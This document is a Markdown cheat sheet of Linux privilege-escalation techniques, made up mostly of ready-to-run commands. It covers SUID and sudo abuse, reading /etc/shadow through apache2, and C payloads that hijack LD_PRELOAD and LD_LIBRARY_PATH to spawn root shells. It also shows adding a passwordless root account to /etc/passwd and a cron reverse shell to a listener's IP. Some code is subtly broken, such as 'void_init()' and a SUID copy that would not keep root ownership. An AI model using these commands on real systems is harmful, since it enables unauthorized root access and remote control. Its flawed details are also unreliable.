# Linux privilege escalation

## SUID binaries
If SUID bit is set on `/bin/bash` and it is owned by root user:
* `cp /bin/bash /tmp/rbash`
* `/tmp/rbash -p`

## Sudo abuse
### List programs user can run
* `sudo -l`

### Known password with unrestricted sudo
* `sudo su`
* `sudo -s`
* `sudo -i`
* `sudo /bin/bash`
* `sudo passwd`

### Shell escape sequences
List of programs and shell escape sequences: [gtfobins](https://gtfobins.github.io/)

### apache2
If apache2 is in the sudo commands and is owned by root:
* `sudo apache2 -f /etc/shadow`

### LD_PRELOAD
If real user id is equal to effective user id and sudo has `env_keep` set correctly:

```c
/* /tmp/file.c */
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void_init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

* `gcc -fPIC -shared -nostartfiles -o /tmp/file.so /tmp/file.c` 
* `sudo LD_PRELOAD=/tmp/file.so <sudo-able command>`

## LD_LIBRARY_PATH
If env_keep is configured to preserve `LD_LIBRARY_PATH`:
List shared object dependencies with `ldd <sudo-able command>`.
Assuming `some_lib.so.1` is in the above list:

```c
/* /tmp/file.c */
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

* `gcc -o some_lib.so.1 -shared -fPIC /tmp/file.c`
* `sudo LD_LIBRARY_PATH=. <sudo-able command>`

## Insecure file permissions
### Writable /etc/passwd
Add user with root privileges `echo root2::0:0:root:/root:/bin/bash >> /etc/passwd`.
Or remove password requirement on real root user by removing `x` in line for root user.


### Cronjobs
If you have write access to a cronjob:

`echo bash -i >& /dev/tcp/$LISTENING_IP/$PORT 0>&1`

## Kernel exploits
Useful tool for finding relevant exploits: [linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)

